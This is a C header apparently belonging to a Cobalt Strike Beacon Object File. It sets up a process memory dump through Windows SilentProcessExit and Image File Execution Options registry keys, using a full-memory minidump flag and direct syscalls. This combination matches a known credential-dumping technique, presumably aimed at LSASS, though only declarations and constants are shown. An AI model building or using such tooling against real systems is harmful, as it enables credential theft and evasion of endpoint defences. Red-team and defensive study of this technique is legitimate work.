#pragma once
#include <windows.h>
#include <stdio.h>

#include "beacon.h"
#include "syscalls-asm.h"

#define STATUS_SUCCESS 0
#define STATUS_UNSUCCESSFUL 0xC0000001
#define OBJ_CASE_INSENSITIVE 0x00000040L

#define IFEO_REG_KEY L"\\Registry\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"
#define SILENT_PROCESS_EXIT_REG_KEY L"\\Registry\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\"
#define LOCAL_DUMP 0x2
#define FLG_MONITOR_SILENT_PROCESS_EXIT 0x200
#define MiniDumpWithFullMemory 0x2

#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)

//KERNEL32
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI void *WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
WINBASEAPI BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, PVOID);

//MSVCRT
WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t *_Str);
WINBASEAPI wchar_t *__cdecl MSVCRT$wcscat(wchar_t *__restrict__ _Dest, const wchar_t *__restrict__ _Source);

//ADVAPI32
WINADVAPI WINBOOL WINAPI ADVAPI32$LookupPrivilegeValueW(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid);

// Unicode function
typedef VOID(WINAPI *_RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
typedef NTSTATUS(NTAPI *_RtlAppendUnicodeToString)(PUNICODE_STRING Destination, PCWSTR Source);
typedef VOID(WINAPI *_RtlFreeUnicodeString)(PUNICODE_STRING UnicodeString);
typedef NTSTATUS(NTAPI *_RtlReportSilentProcessExit)(HANDLE ProcessHandle, NTSTATUS ExitStatus);
